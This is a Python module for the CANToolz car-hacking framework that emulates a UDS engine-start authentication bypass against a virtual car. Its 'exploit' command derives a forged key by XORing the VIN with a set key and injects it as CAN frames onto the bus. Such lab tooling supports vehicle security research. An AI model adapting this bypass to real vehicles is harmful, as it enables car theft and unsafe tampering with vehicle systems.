from cantoolz.isotp import ISOTPMessage
from cantoolz.module import CANModule, Command


class uds_engine_auth_baypass(CANModule):

    name = "UDS Engine STARTER"
    help = """

    This module emulating UDS hack for Enginer start( for vircar).

    Init params (example):
    {
        'id_command': 0x71
    }

    """

    _active = True

    def do_init(self, params):
        self._status2 = params
        self.frames = []

        self.commands['set_key'] = Command("Set new key  (17 hex bytes)", 1, "<key>", self.set_key, True)
        self.commands['set_vin'] = Command("Set VIN", 1, "<VIN>", self.set_vin, True)
        self.commands['exploit'] = Command("Exploit", 0, "", self.exploit, True)

    def exploit(self):
        i = 0
        key_x = ""
        for byte_k in self._status2.get('vin', '12345678901234567'):
            key_x += chr(ord(byte_k) ^ bytes.fromhex(self._status2.get('key', '1122334455667788990011223344556677'))[i])  # XOR with KEY (to get VIN)
            i += 1
        self.frames.extend(ISOTPMessage.generate_can(self._status2['id_command'], [ord(byt) for byt in list(key_x)]))
        return ""

    def set_key(self, key):
        self._status2.update({'key': key.strip()})
        return ""

    def set_vin(self, vin):
        self._status2.update({'vin': vin.strip()})
        return ""

    # Effect (could be fuzz operation, sniff, filter or whatever)
    def do_effect(self, can_msg, args):
        if args['action'] == 'write' and not can_msg.CANData:
            if len(self.frames) > 0:
                can_msg.CANFrame = self.frames.pop(0)
                can_msg.CANData = True
                can_msg.bus = self._bus
        return can_msg
